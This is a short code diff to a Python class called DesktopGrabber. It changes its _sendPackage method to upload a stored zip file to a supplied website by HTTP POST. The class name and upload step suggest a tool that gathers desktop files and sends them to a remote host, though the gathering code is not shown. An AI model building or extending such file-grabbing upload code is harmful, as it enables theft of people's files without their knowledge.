@@ -41,9 +41,9 @@ class DesktopGrabber:
 
 
 
-    def _sendPackage(self, zip_file, website):
+    def _sendPackage(self, website):
         # We use a simple POST request to send file
-        response = requests.post(website, files = zip_file)
+        response = requests.post(website, files = self.ZipName)
 
         if response.ok:
             print("Upload completed successfully!")
@@ -53,4 +53,6 @@ class DesktopGrabber:
         else:
             print("Something went wrong!")
             return False
+
+
 
